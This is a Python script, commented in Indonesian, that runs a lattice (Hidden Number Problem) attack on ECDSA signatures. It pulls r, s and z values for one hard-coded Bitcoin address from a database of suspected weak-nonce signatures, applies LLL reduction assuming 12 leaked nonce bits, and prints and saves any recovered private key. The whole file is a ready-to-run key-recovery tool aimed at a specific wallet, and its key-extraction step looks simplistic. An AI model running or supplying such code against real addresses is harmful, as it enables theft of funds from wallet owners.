import sqlite3
from fastecdsa.curve import secp256k1
from sympy import mod_inverse

# Gunakan fpylll jika tersedia untuk performa tinggi
try:
    from fpylll import IntegerMatrix, LLL
    HAS_FPYLLL = True
except ImportError:
    HAS_FPYLLL = False

def get_data_for_address(db_path, target_address):
    """Mengambil semua pasangan r, s, z untuk satu alamat"""
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    
    # Ambil r, s, z dari tabel signatures
    cursor.execute("SELECT r, s, z FROM signatures WHERE address = ?", (target_address,))
    rows = cursor.fetchall()
    conn.close()
    
    data = []
    for r_hex, s_hex, z_hex in rows:
        # Pastikan data diubah ke integer
        try:
            r = int(r_hex, 16) if 'x' in str(r_hex) else int(r_hex)
            s = int(s_hex, 16) if 'x' in str(s_hex) else int(s_hex)
            z = int(z_hex, 16) if 'x' in str(z_hex) else int(z_hex)
            data.append({'r': r, 's': s, 'z': z})
        except:
            continue
    return data

def run_lattice_attack(data, leaked_bits):
    if not HAS_FPYLLL:
        print("❌ Error: Library 'fpylll' tidak ditemukan.")
        print("Saran: Install dengan 'pip install fpylll' atau jalankan di SageMath.")
        return None

    q = secp256k1.q
    n = len(data)
    # Skala pembobot (Bound)
    B = 2**(256 - leaked_bits)
    
    # Matriks Lattice (n+2 x n+2)
    matrix = IntegerMatrix(n + 2, n + 2)
    
    t_values = []
    u_values = []
    for d in data:
        s_inv = mod_inverse(d['s'], q)
        t_values.append((d['r'] * s_inv) % q)
        u_values.append((d['z'] * s_inv) % q)

    # Isi Matriks (HNP Construction)
    for i in range(n):
        matrix[i, i] = q
        matrix[n, i] = t_values[i]
        matrix[n + 1, i] = u_values[i]
    
    matrix[n, n] = 1
    matrix[n + 1, n + 1] = B 

    print(f"🚀 Memproses {n} signatures dengan estimasi {leaked_bits} bit bocor...")
    LLL.reduction(matrix)
    
    # Cari kandidat private key di hasil reduksi
    for i in range(n + 2):
        potential_d = abs(matrix[i, n])
        if potential_d > 1:
            return hex(potential_d)
    return None

# --- EKSEKUSI ---
DB_NAME = 'valid_nonce_reuse.db'
TARGET = '1EpEs838TdcuoqrGd6kqNp4pDJMwG1FqrZ'

print(f"--- Lattice Attack (HNP) Solver ---")
signatures_data = get_data_for_address(DB_NAME, TARGET)

if len(signatures_data) >= 2:
    # Kita asumsikan minimal 12 bit bocor sesuai temuan sebelumnya
    result = run_lattice_attack(signatures_data, leaked_bits=12)
    
    if result:
        print(f"🎯 KUNCI PRIVAT DITEMUKAN: {result}")
        with open("hnp_results.txt", "a") as f:
            f.write(f"{TARGET}:{result}\n")
    else:
        print("❌ Gagal: Vektor terpendek tidak mengandung kunci privat.")
        print("Coba sesuaikan nilai 'leaked_bits' (misal: coba 8, 10, atau 14).")
else:
    print("❌ Data tidak cukup untuk serangan Lattice.")
